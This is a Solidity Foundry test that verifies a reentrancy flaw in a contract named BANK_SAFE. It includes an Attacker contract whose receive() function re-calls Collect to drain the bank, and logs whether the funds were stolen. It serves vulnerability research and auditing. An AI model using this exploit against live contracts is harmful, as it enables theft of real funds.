// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x561eac93c92360949ab1f1403323e6db345cbf31.sol";

contract ReentrancyTest is Test {
    BANK_SAFE public bank;
    LogFile public logContract;
    Attacker public attacker;

    function setUp() public {
        logContract = new LogFile();
        bank = new BANK_SAFE();
        
        bank.SetLogFile(address(logContract));
        bank.SetMinSum(1 ether);
    }

    function testReentrancyAttack() public {
        attacker = new Attacker(payable(address(bank)));
        
        // Deposit 2 ether to bank (sent from test contract to attacker's deposit function)
        attacker.deposit{value: 2 ether}();
        
        // Record state BEFORE attack
        console2.log("--- BEFORE-Trigger Reentrancy ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerDepositBalanceBefore = bank.balances(address(attacker));

        console2.log("Bank ETH Balance (Before):", bankBalanceBefore);
        console2.log("Attacker ETH Balance (Before):", attackerBalanceBefore);
        console2.log("Attacker Deposit in Bank (Before):", attackerDepositBalanceBefore);

        console2.log("--- TRIGGER Reentrancy ---");
        // Trigger one reentrancy (total 2 withdrawals)
        attacker.attack(1 ether, 1);
        
        console2.log("--- AFTER-Trigger Reentrancy ---");
        // Record state AFTER attack
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerDepositBalanceAfter = bank.balances(address(attacker));

        console2.log("Bank ETH Balance (After):", bankBalanceAfter);
        console2.log("Attacker ETH Balance (After):", attackerBalanceAfter);
        console2.log("Attacker Deposit in Bank (After):", attackerDepositBalanceAfter);

        // Compare state changes
        bool bankDrained = (bankBalanceBefore == 2 ether) && (bankBalanceAfter == 0);
        bool fundsStolen = (attackerBalanceBefore == 0) && (attackerBalanceAfter == 2 ether);
        bool vulnerabilityExists = bankDrained && fundsStolen;

        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Reentrancy attack successfully drained bank funds");
        } else {
            console2.log("Vulnerability not Exist: Bank funds were not drained as expected");
        }
    }
}

contract Attacker {
    BANK_SAFE public target;
    uint public amountPerCall;
    uint public reentrancyTimes;

    constructor(address payable _target) {
        target = BANK_SAFE(_target);
    }

    function deposit() public payable {
        require(msg.value == 2 ether, "Incorrect deposit amount");
        target.Deposit{value: msg.value}();
    }

    function attack(uint _amountPerCall, uint _reentrancyTimes) public {
        amountPerCall = _amountPerCall;
        reentrancyTimes = _reentrancyTimes;
        target.Collect(amountPerCall);
    }

    // Receive function for reentrancy
    receive() external payable {
        if (reentrancyTimes > 0) {
            reentrancyTimes--;
            target.Collect(amountPerCall);
        }
    }
}